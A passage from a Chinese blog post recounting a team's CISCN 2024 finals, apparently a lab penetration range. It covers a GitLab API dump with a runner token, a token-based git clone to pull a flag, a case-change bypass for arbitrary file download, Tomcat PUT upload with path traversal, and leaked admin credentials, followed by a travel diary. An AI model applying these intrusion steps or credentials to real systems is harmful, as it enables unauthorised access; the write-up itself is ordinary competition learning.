property">"path"</span><span class="token operator">:</span> <span class="token string">"vertexsoft"</span><span class="token punctuation">,</span>            <span class="token property">"kind"</span><span class="token operator">:</span> <span class="token string">"group"</span><span class="token punctuation">,</span>            <span class="token property">"full_path"</span><span class="token operator">:</span> <span class="token string">"vertexsoft"</span><span class="token punctuation">,</span>            <span class="token property">"parent_id"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>            <span class="token property">"avatar_url"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>            <span class="token property">"web_url"</span><span class="token operator">:</span> <span class="token string">"http://192.168.8.42/groups/vertexsoft"</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>        <span class="token property">"repository_storage"</span><span class="token operator">:</span> <span class="token string">"default"</span><span class="token punctuation">,</span>        <span class="token property">"_links"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>            <span class="token property">"self"</span><span class="token operator">:</span> <span class="token string">"http://192.168.8.42/api/v4/projects/1"</span><span class="token punctuation">,</span>            <span class="token property">"issues"</span><span class="token operator">:</span> <span class="token string">"http://192.168.8.42/api/v4/projects/1/issues"</span><span class="token punctuation">,</span>            <span class="token property">"merge_requests"</span><span class="token operator">:</span> <span class="token string">"http://192.168.8.42/api/v4/projects/1/merge_requests"</span><span class="token punctuation">,</span>            <span class="token property">"repo_branches"</span><span class="token operator">:</span> <span class="token string">"http://192.168.8.42/api/v4/projects/1/repository/branches"</span><span class="token punctuation">,</span>            <span class="token property">"labels"</span><span class="token operator">:</span> <span class="token string">"http://192.168.8.42/api/v4/projects/1/labels"</span><span class="token punctuation">,</span>            <span class="token property">"events"</span><span class="token operator">:</span> <span class="token string">"http://192.168.8.42/api/v4/projects/1/events"</span><span class="token punctuation">,</span>            <span class="token property">"members"</span><span class="token operator">:</span> <span class="token string">"http://192.168.8.42/api/v4/projects/1/members"</span><span class="token punctuation">,</span>            <span class="token property">"cluster_agents"</span><span class="token operator">:</span> <span class="token string">"http://192.168.8.42/api/v4/projects/1/cluster_agents"</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>        <span class="token property">"packages_enabled"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"empty_repo"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>        <span class="token property">"archived"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>        <span class="token property">"visibility"</span><span class="token operator">:</span> <span class="token string">"private"</span><span class="token punctuation">,</span>        <span class="token property">"resolve_outdated_diff_discussions"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>        <span class="token property">"container_expiration_policy"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>            <span class="token property">"cadence"</span><span class="token operator">:</span> <span class="token string">"1d"</span><span class="token punctuation">,</span>            <span class="token property">"enabled"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>            <span class="token property">"keep_n"</span><span class="token operator">:</span> <span class="token number">10</span><span class="token punctuation">,</span>            <span class="token property">"older_than"</span><span class="token operator">:</span> <span class="token string">"90d"</span><span class="token punctuation">,</span>            <span class="token property">"name_regex"</span><span class="token operator">:</span> <span class="token string">".*"</span><span class="token punctuation">,</span>            <span class="token property">"name_regex_keep"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>            <span class="token property">"next_run_at"</span><span class="token operator">:</span> <span class="token string">"2024-07-12T15:53:27.309Z"</span>        <span class="token punctuation">&#125;</span><span class="token punctuation">,</span>        <span class="token property">"repository_object_format"</span><span class="token operator">:</span> <span class="token string">"sha1"</span><span class="token punctuation">,</span>        <span class="token property">"issues_enabled"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"merge_requests_enabled"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"wiki_enabled"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"jobs_enabled"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"snippets_enabled"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"container_registry_enabled"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"service_desk_enabled"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>        <span class="token property">"service_desk_address"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>        <span class="token property">"can_create_merge_request_in"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"issues_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>        <span class="token property">"repository_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>        <span class="token property">"merge_requests_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>        <span class="token property">"forking_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>        <span class="token property">"wiki_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>        <span class="token property">"builds_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>        <span class="token property">"snippets_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>        <span class="token property">"pages_access_level"</span><span class="token operator">:</span> <span class="token string">"private"</span><span class="token punctuation">,</span>        <span class="token property">"analytics_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>        <span class="token property">"container_registry_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>        <span class="token property">"security_and_compliance_access_level"</span><span class="token operator">:</span> <span class="token string">"private"</span><span class="token punctuation">,</span>        <span class="token property">"releases_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>        <span class="token property">"environments_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>        <span class="token property">"feature_flags_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>        <span class="token property">"infrastructure_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>        <span class="token property">"monitor_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>        <span class="token property">"model_experiments_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>        <span class="token property">"model_registry_access_level"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>        <span class="token property">"emails_disabled"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>        <span class="token property">"emails_enabled"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"shared_runners_enabled"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"lfs_enabled"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"creator_id"</span><span class="token operator">:</span> <span class="token number">1</span><span class="token punctuation">,</span>        <span class="token property">"import_url"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>        <span class="token property">"import_type"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>        <span class="token property">"import_status"</span><span class="token operator">:</span> <span class="token string">"none"</span><span class="token punctuation">,</span>        <span class="token property">"open_issues_count"</span><span class="token operator">:</span> <span class="token number">0</span><span class="token punctuation">,</span>        <span class="token property">"description_html"</span><span class="token operator">:</span> <span class="token string">""</span><span class="token punctuation">,</span>        <span class="token property">"updated_at"</span><span class="token operator">:</span> <span class="token string">"2024-07-15T14:37:09.617Z"</span><span class="token punctuation">,</span>        <span class="token property">"ci_default_git_depth"</span><span class="token operator">:</span> <span class="token number">20</span><span class="token punctuation">,</span>        <span class="token property">"ci_forward_deployment_enabled"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"ci_forward_deployment_rollback_allowed"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"ci_job_token_scope_enabled"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>        <span class="token property">"ci_separated_caches"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"ci_allow_fork_pipelines_to_run_in_parent_project"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"build_git_strategy"</span><span class="token operator">:</span> <span class="token string">"fetch"</span><span class="token punctuation">,</span>        <span class="token property">"keep_latest_artifact"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"restrict_user_defined_variables"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>        <span class="token property">"runners_token"</span><span class="token operator">:</span> <span class="token string">"GR13489414oQjRCnTobkTwZpR65iS"</span><span class="token punctuation">,</span>        <span class="token property">"runner_token_expiration_interval"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>        <span class="token property">"group_runners_enabled"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"auto_cancel_pending_pipelines"</span><span class="token operator">:</span> <span class="token string">"enabled"</span><span class="token punctuation">,</span>        <span class="token property">"build_timeout"</span><span class="token operator">:</span> <span class="token number">3600</span><span class="token punctuation">,</span>        <span class="token property">"auto_devops_enabled"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"auto_devops_deploy_strategy"</span><span class="token operator">:</span> <span class="token string">"continuous"</span><span class="token punctuation">,</span>        <span class="token property">"ci_config_path"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>        <span class="token property">"public_jobs"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"shared_with_groups"</span><span class="token operator">:</span> <span class="token punctuation">[</span><span class="token punctuation">]</span><span class="token punctuation">,</span>        <span class="token property">"only_allow_merge_if_pipeline_succeeds"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>        <span class="token property">"allow_merge_on_skipped_pipeline"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>        <span class="token property">"request_access_enabled"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"only_allow_merge_if_all_discussions_are_resolved"</span><span class="token operator">:</span> <span class="token boolean">false</span><span class="token punctuation">,</span>        <span class="token property">"remove_source_branch_after_merge"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"printing_merge_request_link_enabled"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"merge_method"</span><span class="token operator">:</span> <span class="token string">"merge"</span><span class="token punctuation">,</span>        <span class="token property">"squash_option"</span><span class="token operator">:</span> <span class="token string">"default_off"</span><span class="token punctuation">,</span>        <span class="token property">"enforce_auth_checks_on_uploads"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"suggestion_commit_message"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>        <span class="token property">"merge_commit_template"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>        <span class="token property">"squash_commit_template"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>        <span class="token property">"issue_branch_template"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>        <span class="token property">"warn_about_potentially_unwanted_characters"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"autoclose_referenced_issues"</span><span class="token operator">:</span> <span class="token boolean">true</span><span class="token punctuation">,</span>        <span class="token property">"permissions"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>            <span class="token property">"project_access"</span><span class="token operator">:</span> <span class="token null keyword">null</span><span class="token punctuation">,</span>            <span class="token property">"group_access"</span><span class="token operator">:</span> <span class="token punctuation">&#123;</span>                <span class="token property">"access_level"</span><span class="token operator">:</span> <span class="token number">50</span><span class="token punctuation">,</span>                <span class="token property">"notification_level"</span><span class="token operator">:</span> <span class="token number">3</span>            <span class="token punctuation">&#125;</span>        <span class="token punctuation">&#125;</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">]</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>直接拉下第一个<code>git clone http://oauth2:&lt;API_TOKEN&gt;@192.168.8.42/vertexsoft/vertexsoftbackup.git</code>然后里面的backups.txt就是最后GitLab的flag</p><hr><h2 id="portal（Unsolved）"><a href="#portal（Unsolved）" class="headerlink" title="portal（Unsolved）"></a>portal（Unsolved）</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>*<span class="token punctuation">]</span> WebTitle http://192.168.8.9:8000   code:200 len:4018   title:Modbus Monitor - VertexSoft Internal Attendance System<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre><p>这题是modbus monitor那个服务</p><p>随便注册一个用户发现需要admin才能查看某些信息，尝试直接抓包改传入的参数</p><p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/image-20240721115531554.png" alt="image-20240721115531554"></p><p>User Management下有admin的详细信息</p><p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/image-20240721115747461.png" alt="image-20240721115747461"></p><p><code>admin:A1m!n@Qsx1Jn</code></p><p>头像处有个文件上传的功能，但是没啥用</p><p>User List的左上角还有一个Export List的选项可以下载文件，存在任意文件下载</p><p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/image-20240721223030799.png" alt="image-20240721223030799"></p><p>测试发现web.config被ban了</p><p>赛后得知可以直接用<strong>大小写</strong>绕过来读取..&#x2F;web.config，从而得到mssql服务的密码（注意要用admin账号）</p><p>然后数据库连上去一把梭了（？</p><hr><h2 id="WIN-PC3788（Unsolved）"><a href="#WIN-PC3788（Unsolved）" class="headerlink" title="WIN-PC3788（Unsolved）"></a>WIN-PC3788（Unsolved）</h2><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash"><span class="token punctuation">[</span>*<span class="token punctuation">]</span> NetInfo <span class="token punctuation">[</span>*<span class="token punctuation">]</span><span class="token number">192.168</span>.8.26   <span class="token punctuation">[</span>-<span class="token operator">></span><span class="token punctuation">]</span>WIN-PC3788   <span class="token punctuation">[</span>-<span class="token operator">></span><span class="token punctuation">]</span><span class="token number">192.168</span>.8.26<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span></span></code></pre><p>Tomcat8.5.71，fuzz半天只有一个&#x2F;backup&#x2F;upload</p><p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/image-20240721232402649.png" alt="image-20240721232402649"></p><p>路径下只有index.jsp</p><p>赛后得知可以PUT文件上传，类似CVE-2017-12615：<a href="https://xz.aliyun.com/t/5610">https://xz.aliyun.com/t/5610</a></p><p>但是upload目录不解析jsp，目录穿越到backup即可<code>/backup/;../upload</code></p><hr><h2 id="DC（Unsolved）"><a href="#DC（Unsolved）" class="headerlink" title="DC（Unsolved）"></a>DC（Unsolved）</h2><p>hint：In the real world, Control of RODC Active Directory Computer Object is dangerous</p><p><del>只要能拿下这2000分，一切都会好起来的</del></p><hr><h1 id="游记（？"><a href="#游记（？" class="headerlink" title="游记（？"></a>游记（？</h1><h2 id="day0"><a href="#day0" class="headerlink" title="day0"></a>day0</h2><p><del>（这个应该是day-1）</del>因为前一天去的机票和队友买的不是同一个时间段，导致自己一个人打车-坐动车-坐飞机-坐地铁-找酒店，最后晚上11点了才歇下来，不过成都的夜景还挺热闹的</p><p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/1721746386030.jpg" alt="1721746386030"></p><p>（你拍的什么🐕8，糊成这样）（（（</p><p>正式开始day0，去川大报道</p><p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/1721746798383.jpg" alt="1721746798383"></p><p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/1721746798391.jpg" alt="1721746798391"></p><p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/1721746798375.jpg" alt="1721746798375"></p><p>校园很大，有一种刘姥姥进大观园的美，感觉像是学园都市（什 </p><p>最重要的是这里没有减速带！star在装减速带这方面遥遥领先了！（x</p><p>然后就是设备测试</p><p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/1721747099417.jpg" alt="1721747099417"></p><p>笑点解析：下面那个才是我的热点</p><p>唉柚子厨共用一个大脑（</p><p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/1721747257847.jpg" alt="1721747257847"></p><p>还是校内的大楼，感觉好高级，这就是985吗orz</p><h2 id="day1"><a href="#day1" class="headerlink" title="day1"></a>day1</h2><p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/1721747447512.jpg" alt="1721747447512"></p><p>是 AWDP + 可信计算ctf</p><p>awdp一上来就看上了js，很快啊，ejs3.1.6，render方法，文件上传，欸这不就稳了吗</p><p>然后照着数字中国那题ssti来修这玩意，给定式思维害了，没注意到render方法里面需要传两个参数</p><p>直到第6轮的时候才凭借先知文库的找到正确的漏洞点并完成了fix，然后第8轮的时候才成功break，然后因为忙着补充wp细节还和三血失之交臂了555</p><p>最重要的是没注意到这个awdp的模式是n血分分数还会递减，会导致我们每一轮都比别人少加分</p><p>python那题本地环境起不来调试不了，感觉人都麻了</p><p>然后是去尝试fix SolonMaster，不幸地，我这阵子学的java里面刚好唯独没学fastjson，看到依赖里面有个fastjson的时候心凉了半截（</p><p>没办法只能硬给resolveClass加黑，但是我接触的java实在是太少了最终也没能修成</p><p>最后就默默吃分到了day1结束，还好js break得快能够扳回一城，不然便样衰了。。</p><p>3点结束回到酒店直接躺床上睡大觉zzz，队友倒是直接去玩了</p><p>晚上便是准备一点渗透相关的东西</p><h2 id="day2"><a href="#day2" class="headerlink" title="day2"></a>day2</h2><p><del>你说得对，但今天是0721，中间忘了，因为今天就是这样的日子嘛.jpg</del></p><p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/image-20240724000510733.png" alt="image-20240724000510733"></p><p>渗透 + 车联网&amp;工控</p><p>我自然是负责前者了</p><p>什么，我做内网代理，真的假的？</p><p>到了场地之后巨魔才发现没带拓展坞于是又回去拿，而我stowaway内网代理搞不明白卡了半天，然后erp又没学过，看着大伙一个个解出erp的时候确实有点急了</p><p>好在fscan扫出来的洞是heapdump泄露，此事在我的<a href="https://c1oudfl0w0.github.io/blog/2023/10/25/0xGameCTF-Week4/#spring-%E5%A4%8D%E7%8E%B0">0xgame week4</a>中亦有记载，运气也是挺好，接下来就是一个简单的shiro利用一把梭getshell，也算是赛棍魅力时刻（</p><p>然后做代理的事情全部交给巨魔了，巨魔那边不知道为什么vps总是掉线，没办法只能来我的电脑上操作chisel代理（怎么有人开了快十个终端一个个代理啊x</p><p>后面才想起来可以直接socks代理出去，问题不大</p><p>WIN-OPS88这里不知道为什么MDUT连不上去数据库，报jdbc的错误，问题不大，我直接把里面的udf.txt顷刻炼化，手动注入便是（</p><p>Jenkins因为rwctf的时候接触过一次，看到的时候还挺兴奋x，队友测出是弱密码进入，然后我这里利用本地的先知文库找到后台groovy命令执行的方法，成功拿下</p><p>可惜在上午解出三题之后我们便没有较大进展了，浪费不少时间在portal的任意文件读取上面，忘了Windows getshell之后可以尝试rbp远程连接导致RODC没出，后面很多队都只比我们多了100分，就是差在这里</p><p>一点半的时候我开始吃午饭，同时刷着先知文库寻找突破口，在最后十五分钟的时候突然发现gitlab好像是春秋云境的原题，但是Jenkins靶机响应慢如乌龟，拼尽全力也无法及时复现，又一次血亏😭</p><p>至于WIN-PC3788，有想过是PUT文件上传但感觉版本对不上于是没去实践😭</p><p>最终的成绩是国二，也是刷新了协会的历史记录</p><p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/1721702570194.jpg" alt="1721702570194"></p><p>虽然还是有点遗憾，没能在最后两小时稳住优势，但是已经足够了，所谓的 True Ending 是大家在拼尽全力之后到达的，tql各位</p><p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/1721750363736.jpg" alt="1721750363736"></p><p>好了，两天的985梦结束了，归来依旧是那个臭双非（</p><p>晚宴，菜是一盘接一盘的上，红不拉几的，不过还是吃了不少才回去，yysy川剧变脸和喷火很好看，晚宴的抽奖也是被挖出鉴权0day了（</p><h2 id="后日谈"><a href="#后日谈" class="headerlink" title="后日谈"></a>后日谈</h2><p>回到酒店还是睡觉，醒来也是慢悠悠的整理东西，仔细一想我好像除了比赛根本没出过门！有点后悔结束后的第二天早上没跟着Laffey去展子玩了（我嘞个漫展特种兵</p><p>然后在床上瘫了一早上belike</p><p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/1721751089662.jpg" alt="1721751089662"></p><p>回去的飞机上依旧是看番度过的</p><p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/1721751277252.jpg" alt="1721751277252"></p><p>别在这里发电.jpg</p><p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/1721751277246.jpg" alt="1721751277246"></p><p>可爱捏</p>]]></content>
    
    
    <summary type="html">&lt;h1 id=&quot;前言&quot;&gt;&lt;a href=&quot;#前言&quot; class=&quot;headerlink&quot; title=&quot;前言&quot;&gt;&lt;/a&gt;前言&lt;/h1&gt;&lt;p&gt;2024.7.20-21	成都&lt;/p&gt;
&lt;p&gt;NISA-WhySerious	位37	全国二等奖&lt;/p&gt;</summary>
    
    
    
    <category term="线下赛" scheme="http://c1oudfl0w0.github.io/blog/categories/%E7%BA%BF%E4%B8%8B%E8%B5%9B/"/>
    
    
    <category term="Nodejs" scheme="http://c1oudfl0w0.github.io/blog/tags/Nodejs/"/>
    
    <category term="SSTI" scheme="http://c1oudfl0w0.github.io/blog/tags/SSTI/"/>
    
    <category term="Java" scheme="http://c1oudfl0w0.github.io/blog/tags/Java/"/>
    
    <category term="内网" scheme="http://c1oudfl0w0.github.io/blog/tags/%E5%86%85%E7%BD%91/"/>
    
    <category term="沙箱逃逸" scheme="http://c1oudfl0w0.github.io/blog/tags/%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/"/>
    
    <category term="jwt" scheme="http://c1oudfl0w0.github.io/blog/tags/jwt/"/>
    
  </entry>
  
  <entry>
    <title>Thymeleaf SSTI</title>
    <link href="http://c1oudfl0w0.github.io/blog/2024/07/10/Thymeleaf-SSTI/"/>
    <id>http://c1oudfl0w0.github.io/blog/2024/07/10/Thymeleaf-SSTI/</id>
    <published>2024-07-09T16:29:06.000Z</published>
    <updated>2024-07-11T07:27:01.102Z</updated>
    
